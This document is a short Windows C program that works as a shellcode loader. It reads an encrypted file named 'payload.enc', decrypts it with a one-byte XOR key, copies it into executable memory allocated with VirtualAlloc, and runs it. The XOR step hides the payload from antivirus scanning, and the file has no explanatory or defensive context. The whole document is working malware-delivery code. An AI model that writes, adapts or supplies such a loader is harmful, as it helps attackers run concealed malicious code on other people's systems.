#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

char key = 0x57;
int main() {
    FILE *fp;
    long size;
    char *encrypted;
    // Open encrypted shellcode
    fp = fopen("payload.enc", "rb");
    if (fp == NULL) {
        printf("[-] Cannot open payload.enc\n");
        return 1;
    }
    // Get file size
    fseek(fp, 0, SEEK_END);
    size = ftell(fp);
    rewind(fp);
    // Read encrypted payload
    encrypted = (char *)malloc(size);
    fread(encrypted, 1, size, fp);
    fclose(fp);
    // Decrypt shellcode
    for (int i = 0; i < size; i++) {
        encrypted[i] ^= key;
    }
    // Allocate memory with execution rights
    void *exec = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, encrypted, size);
    // Execute shellcode
    ((void(*)())exec)();
    return 0;
}
